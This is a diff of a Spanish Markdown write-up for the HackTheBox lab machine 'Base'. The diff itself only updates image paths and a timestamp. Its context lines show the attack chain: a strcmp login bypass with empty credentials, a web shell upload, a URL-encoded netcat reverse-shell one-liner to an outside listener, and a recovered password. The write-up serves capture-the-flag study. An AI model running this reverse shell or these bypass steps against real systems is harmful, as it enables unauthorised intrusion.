@@ -1,7 +1,7 @@
 ---
 publish: true
 created: 2026-09-11T12:16:55.927Z
-modified: 2026-09-11T12:24:55.375Z
+modified: 2026-09-11T18:12:57.329Z
 ---
 
 # Base
@@ -73,7 +73,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
   Vemos que la web tiene una pagina de login
 
-  ![image.png](/images/HackTheBox/image.png)
+  ![image.png](WriteUps/images/HackTheBox/image.png)
 
   Siguiendo las indicaciones vemos que nos habla de _strcmp_ 
 
@@ -83,7 +83,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
   Se acontece pasando valores en blanco de los parametros username y password
 
-  ![image.png](/images/HackTheBox/image%201.png)
+  ![image.png](WriteUps/images/HackTheBox/image 1.png)
 
   Una vez hecho vemos el formulario de subida de ficheros
 
@@ -104,7 +104,7 @@ Probamos a subir una revershell : cmdshell
 
 Accedemos al directorio de descargas /.uploaded y prbamos un woami
 
-![image.png](/images/HackTheBox/image%202.png)
+![image.png](WriteUps/images/HackTheBox/image 2.png)
 
 Tenemos RCE, probamos a obtener una Shell
 
@@ -116,7 +116,7 @@ URlEncodeamos
 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.16.103%204444%20%3E%2Ftmp%2Ff
 ```
 
-![image.png](/images/HackTheBox/image%203.png)
+![image.png](WriteUps/images/HackTheBox/image 3.png)
 
 Hacemos el tratamiento de la tty
 
@@ -142,7 +142,7 @@ $password = "thisisagoodpassword"
 
 Probamos a migrar a usuario Jhon
 
-![image.png](/images/HackTheBox/image%204.png)
+![image.png](WriteUps/images/HackTheBox/image 4.png)
 
 En el home, encontramos el flag user.txt
 
